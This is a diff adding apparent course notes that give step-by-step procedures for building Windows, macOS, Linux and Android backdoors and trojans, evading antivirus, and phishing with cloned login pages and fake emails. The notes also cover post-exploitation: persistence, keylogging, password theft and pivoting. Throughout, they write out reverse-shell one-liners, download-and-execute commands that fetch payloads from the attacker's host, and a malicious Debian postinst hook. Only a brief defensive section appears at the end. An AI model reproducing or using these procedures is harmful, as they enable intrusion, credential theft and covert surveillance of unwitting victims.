@@ -1,0 +1,518 @@
+Generate Backdoor
+=================
+
+Tools for generates undetectable metasploit backdoors
+-----------------------------------------------------
+1. Veil
+2. TheFatRat
+3. Empire
+
+TheFatRat
+=========
+1. fatrat
+2. 6 (1000%)
+3. 1 (FUL 100%)
+4. set LHOST PORT FILENAME accordingly
+
+msfconsole
+----------
+1. use exploit/multi/handler
+2. set PAYLOAD windows/meterpreter/reverse_https
+3. set LHOST [host ip]
+4. set LPORT [port for payload]
+5. save <<< save configuration
+6. exploit
+7. Open apache2 and go download and run
+
+Empire
+======
+1. listeners
+2. uselistener (space double tap) <<< see available options
+3. uselistener http <<< select
+4. info
+5. set Port 8080
+6. help 
+7. execute <<< execute listener
+8. back <<< got back
+9. list <<< list active listener
+
+To Generate Backdoor
+--------------------
+1. usestager (space double tap)
+2. usestager windows/launcher_bat
+3. info
+4. set Listener http
+5. set OutFile /var/www/html/share/empire_http_8080.bat
+6. execute <<< generate backdoor
+7. agents
+8. If kena (interact [Name]) <<< hack in
+
+Empire generate bat can be easily use notepad to change signature, but Veil cannot
+E.g. add /min or /b
+
+
+------------------------------------------------------------------------------------
+
+Keylogger
+=========
+1. BeeLogger (key info send into email, exploit)
+2. LaZagne (Password recovery, post-exploit)
+chmod 777 /var/www/html/share/laZagne.txt
+LaZagne.exe browsers
+use the txt into bat
+
+To Bypass Executable from Anti Virus
+====================================
+1. Download HxD hex editor (replace right side normal text - with same number of characters)
+
+Technique for download and execute payload
+==========================================
+1. Use the download-and-execute.txt (provide url for malicious executable, remember unicode use string '') and turn into bat
+
+OR
+
+1. download-and-execute.txt into au3
+2. Use CompileScripexxxx to convert
+
+---------------------------------------------------------------------------------------
+
+Trojan Horse
+============
+1. Use the download-and-execute.txt
+2. To run the bat silently, just convert .bat into .exe by using Bat To Exe Converter 
+
+Change file icon
+----------------
+1. Can be change in Bat to Exe Converter
+2. Icon archieve >>> iConvert (png to ico)
+3. Change file extension (e.g. exe to pdf|jpg)
+
+Change file extension
+---------------------
+Use characters (right to left) <<< App in kali linux
+1. zaid.exe into zaid-pdf.exe (pdf >>> fdp read character from right to left)
+
+Generate fake microsoft doc with backdoor
+-----------------------------------------
+1. Go to empire
+2. usestager
+3. usestager windows/macro
+4. info
+5. set Listener http
+6. set OutFile /var/www/html/evil-files/http_8080_macro
+7. execute
+Use the macro given, put inside doc file macro section 
+(Latest: use the download macro content to bypass Anti Virus)
+
+OS X Backdoor
+=============
+Veil - python, FatRat - 01, Empire, osx stager
+
+Msfvenom
+1. msfvenom --payload python/meterpreter/reverse_tcp LHOST=[host ip] LPORT=[port] > rev_tcp_4444.py
+2. cp rev_tcp_4444.py /var/www/html/evil-files
+3. msfconsole
+4. set payload python/meterpreter/reverse_tcp
+5. set LPORT=[port]
+6. exploit
+7. Use python filename.py <<< to execute
+
+Empire
+1. listeners
+2. uselistener http
+3. info
+4. set Port [new port than other listener]
+5. execute
+6. usestager osx/applescript
+7. set Listener http1
+8. set OutFile /var/www/html/share/osx_http_888
+9. Download and convert into script by using Script Editor
+
+Convert into Trojan horse
+-------------------------
+1. cd /tmp/ && curl http://www.pdf995.com/samples/pdf.pdf -0 -s && open pdf.pdf (<<< use this to execute your bat or exe)
+2. Then add "curl http://[host ip]/rev_tcp_444.py -0 && python rev_tcp_4444.py"
+
+Change Trojan Icon
+------------------
+1. Use iconvert to convert the png into icns(finder ready)
+2. Extract the file
+3. Script Editor > File > New > Coco App xxx > paste your code
+4. Show side, copy the name
+5. Drag and drop the icon with the name
+6. File > Export > disable show startup screen
+
+Silently Run Trojan Horse
+-------------------------
+1. Right click the trojan horse and select show package contents
+2. Contents > info.plist
+3. Add <key>NSUIElement</key>
+       <string>1</string>
+
+Embed backdoor into excel file
+------------------------------
+1. Empire > usestager osx/macro
+2. set Listener http1
+3. set OutFile /var/www/html/share/osxMacro
+4. Create excel > view > view macro > macro name = 'Auto_Open' and click +
+5. paste the macro code (modify Sub xxx into Sub Auto_Open())
+
+FatRat <<< simple & easy  
+
+Linux Backdoor
+==============
+
+Using netcat
+------------
+In kali linux
+1. nc -vv -l -p [port]
+
+
+In ubuntu (works in all linux)
+1.1 bash -i >& /dev/tcp/[host ip of kali]/[port] 0>&l
+Can put inside text editor and execute by command "bash [filename]"
+
+Empire
+------
+1. usestager multi/bash
+2. set Listener http
+3. set OutFile /var/www/html/share/basic_bash_shell
+4. info
+5. execute
+Generate code only, not executable, therefore, need "bash [filename]"
+
+Zlogger - Keylogger for Linux (created by the course instructor)
+----------------------------------------------------------------
+1. Download it from git
+2. cd /opt/ > git clone [git link]
+3. install it
+4. python zlogger.py <<< start the app
+5. Enter credential and info
+6. cp dist/keylogger /var/www/html/share/keylogger
+7. Download it from victim and "chmod +x keylogger" and run it
+
+LaZagne (Post-exploit)
+-------
+1. Download it according to OS
+2. Operator same like windows
+
+Execute & Report
+----------------
+1. Use the ZReporter.py provided
+2. Set the command "cd /tmp/ && wget -q http://[ip]/share/LaZagne && chmod +x LaZagne && ./LaZagne all"
+3. Configure the email
+4. Convert into executable (pip install pyinstaller)
+5. pyinstaller --onefile [filename]
+6. dist/ZReporter <<< generated executable
+
+Trojan Horse
+------------
+1. Ubuntu debian packages > packages > xenial > web > simply choose one <<< to get deb update package to embed evil code
+2. dpkg -x [filename.deb] flash-update(this is the destination output directory) <<< to extract
+3. ar -x [filename.deb]
+4. extract control.tar.gz
+5. Copy Control > control & postinst into [output folder] > create folder "DEBIAN" > paste the control file
+6. leafpad [control filename] > paste malicious code inside to execute
+7. Example code "#!/bin/bash sudo bash -i >& /dev/tcp/[ip]/8080 0>&1"
+8. Save into the DEBIAN and named as "postinst" (If postinst exist, just put code inside without a new one)
+9. Change into executable "chmod 755 postinst"
+10. dpkg-deb --build [outputfile]/ > will get a deb file
+11. copy .deb file into apache share
+12. nc -vv -l -p 8080
+13. Run the deb then get hacked :)
+
+Android Backdoor as Trojan Horse
+================================
+1. Download any apk file act as trojan horse
+2. Open fatrat
+3. Backdooring Orignal apk
+4. set LHOST and LPORT accordingly
+5. select android/meterpreter/reverse_http
+6. use backdoor-apk
+7. no need listener (At this moment, new apk generated)
+8. msfconsole
+9. use the andoird/meterpreter/reverse_http
+10. set the options accordingly such as LHOST and LPORT
+11. exploit
+12. Let victim download the apk and install
+13. Get hacked :)
+
+----------------------------------------------------------------------------
+
+Delivery Methods
+================
+1. Fake Emails
+File(Backdoor) upload: 1fichier.com
+URL shorten: bit.do, bit.ly
+Anonymous Email: anonymousemail.me
+
+2. Replicate website login page
+Firefox ScrapBook <<< download web page
+Save page as ... (depth link 1)
+
+Command
+-------
+1. setoolkit
+2. Social Engineering Attacks > Website Attack Vectors > Credentials
+3. Custom Import
+4. Enter [host ip]
+5. Set Path for clone website /root/Downloads/exampleFolder/
+6. Copy entire folder (2)
+7. Enter url of real website 
+8. Send fake emails to victim and get hacked :)
+
+BEFF Framework
+--------------
+1. Open BeEf (username and password = beef)
+2. Plug the script into html
+3. Let victim lauch the web page and get hacked :)
+
+Indirect Delivery - Generating fake traffic for google analytics
+----------------------------------------------------------------
+1. Get victim google-analytics id
+2. setoolkit > social engineering > third party module > google analytics
+3. Choose manual
+4. Set ID, domain name for target website, link after the domain name, page title, referal page (page you want the target to go to)
+5. print payload > send payload on loop
+6. set interval seconds to surf the page
+
+Backdoor works outside local network
+====================================
+1. Generate backdoor with router ip (get from what's my ip)
+2. msfconsole | listener listen for local host ip
+3. Router settings, ip/port/virtual network forwarding
+Public port 8080, target port 8080, target ip address = local host ip
+Public port 80, target port 80, target ip address = local host ip (for apache2)
+
+BeEF
+----
+1. set script ip to router ip
+2. Router ip forwarding, port 3000 for target host ip
+
+
+--------------------------------------------------------------------------------------
+
+Post Exploitation
+=================
+1. Command
+uname -a <<< system info
+whoami <<< user name
+ifconfig <<< interface info
+
+2. Convert access to be powered as Empire
+
+cd /tmp
+pwd
+curl/wget http://[host ip]/share/basic_bash_shell
+ls
+bash basic_bash_shell
+
+cd /opt/Empire
+./Empire
+agents
+interact [host name]
+sysinfo
+
+Privilege upgraded :)
+
+3. Imediate link to victim when they executable backdoor
+nc -vv -l -p 8888 -c "cd /tmp/ && wget http://[host ip]/share/basic_bash_shell && bash basic_bash_shell"
+Victim need to execute this line of code
+bash -i >& /dev/tcp/[host ip]/8888 0>&l
+
+4. Meterpreter Basics
+> help <<< shows help
+> background <<< backgrounds current session
+> sessions -l <<< lists all sessions
+> sessions -i [id] <<< interact with a certain session
+> sysinfo <<< displays system info
+> ps <<< lists all the processes
+> migrate [id of the reliable process such as explorer.exe] <<< migrate backdoor session into reliable service
+> ipconfig <<< displays info about interfaces
+> getuid - shows current user
+
+5. File System Commands
+> pwd <<< shows current working directory
+> ls <<< lists files in the current working directory
+> cd [location] <<< changes working directory to [location]
+> cat [file] <<< prints the content of [file] on screen
+> download [file] <<< downloads [file]
+> upload [file] <<< uploads [file]
+> execute -f [file] <<< execute [file]
+> help <<< lists all the available options
+> shell <<< change into windows command line
+> help <<< view windows command line options
+
+6. Maintaining Access
+Using veil-evasion -> does not always work
+- Create reverse backdoor service, download and execute on victim machine
+
+Using persistence module -> detectable by antivirus programs
+> run persistence -h <<< meterpreter help options
+> run persistence -U -i 20 -p 80 -r [host ip]
+
+
+Using metasploit + veil-evasion -> more robust + undetectable by Antivirus
+> run persistence -h <<< meterpreter help options
+> run persistence -U -i 20 -p 80 -r [host ip]
+> background
+> use exploit/windows/local/persistence
+> set EXE_NAME browser.exe
+> set SESSION [background session]
+> show options
+> show advanced
+> set EXE::Custom /var/www/html/share/backdoor.exe
+> show advanced
+> exploit
+You will get a clean up RC file, is to delete backdoor when you want to stop using it
+> sessions -K
+> use exploit/multi/handler
+
+7. Key Logging
+> keyscan_start <<< shows current working directory
+> keyscan_dump <<< lists files in the current working directory
+> keyscan_stop <<< changes working directory to [location]
+PS: can also take a screenshot of the target computer > screenshot
+
+Open meterpreter
+> keyscan_start
+> keyscan_dump
+> keyscan_stop
+> screenshot
+
+8. Pivoting - Hack other devices in the victim network
+Pivoting using Autoroute
+> use post/windows/manage/autoroute
+> set subnet [subnet] <<< set subnet of target network
+> set session [id] <<< set session id
+> exploit
+
+msf exploit > sessions -l
+> use exploit/multi/samba/usermap_script
+> show options 
+> set RHOST [IP of unidentified host]
+> show payloads
+> set PAYLOAD cmd/unix/bind_netcat
+> show options
+> exploit
+Exploit failed message, don't worry
+
+> sessions -i 1
+> ifconfig
+> Find interface with ip address (Not connected host)
+> background
+> use post/windows/manage/autoroute
+> set SESSION [the session id]
+> set SUBNET [just now host ip]
+> exploit
+> use exploit/multi/samba/usermap_script
+> show options
+> exploit
+Get hacked :)
+ 
+9. Meterpreter on Android
+Meterpreter on connection with android phone
+> sysinfo
+> help
+> webcam_list
+> dump_contacts
+> dump_sms
+
+10. Meterpreter on OS X
+> sysinfo
+> getuid
+> background
+> use exploit/osx/local/persistence <<< maintain access
+> show options
+> set RUN_NOW true
+> sessions -l
+> set SESSION [just now session id]
+> show payloads
+> set PAYLOAD osx/x86/shell_reverse_tcp
+> set LHOST [host ip]
+> set LPORT [port]
+> show options
+> exploit
+3 Command will be provided to delete the connection
+> use exploit/multi/handler
+> set PAYLOAD osx/x86/shell_reverse_tcp
+Set LHOST and LPORT same with just now
+> exploit
+
+11. Empire Post Exploitation
+> ./Empire
+> agents
+> interact [Name]
+> help
+> sysinfo
+> whoami
+> ifconfig
+> back
+> list
+> interact [Other host]
+
+File System Commands
+> pwd
+> cd ..
+> ls
+> cat [filename.txt]
+> download [filename]
+> upload [filename]
+> help
+> help agentcmds
+> upload [file pth of backdoor]
+> ls <<< check permission
+> Msfconsole go listen
+> shell [filename]
+
+Windows module for post-exploitation (same with others os, just usemodule <double tap> see available module)
+> usemodule <double tap>
+> ps <<< lists all processes (look for explorer.exe)
+> usemodule management/psinject
+> info
+> set ProcId [Id for explorer.exe since it is not suspicious]
+> set Listener http
+> execute
+
+Stealing root password (OS X)
+> usemodule <double tap>
+> usemodule collection/osx/prompt
+> info
+> execute (y <<< take care)
+> back
+> sysinfo (If high integrity == 0, not admin)
+> whoami
+> usemodule privesc/multi/sudo_spawn
+> set Listener http1
+> set Password [stolen password just now]
+> execute
+> back util agents
+> list
+> interact [root user :)]
+
+Maintaining Access on OS X
+> usemodule <double tap>
+> usemodule persistence/osx/launchdaemonexecutable
+> info
+> set DaemonLocation /Library/Application Support/QucikTimeDaemon
+> set Listener http1
+> info
+> set DaemonName com.apple.QucikTime
+> execute (y)
+
+---------------------------------------------------------------------------------------------------
+
+Security
+========
+1. Detecting fake spoofed emails
+- Via what domain name
+- Click right side drop down, click "Show original", check the detailed information
+
+2. Protect yourself from browser exploit
+- nojavascript plugin: allow only trusted web page
+
+3. Check trojan horse
+- Check file properties, make sure it is not executable for usual file
+- Try rename file name 
+- Resource manager view suspicious for remote address (check by reverse ip domain lookup, e.g. cmd ping the remote address, or remote dns lookup site check)
+- Online sandbox service (e.g. hybrid analysis)
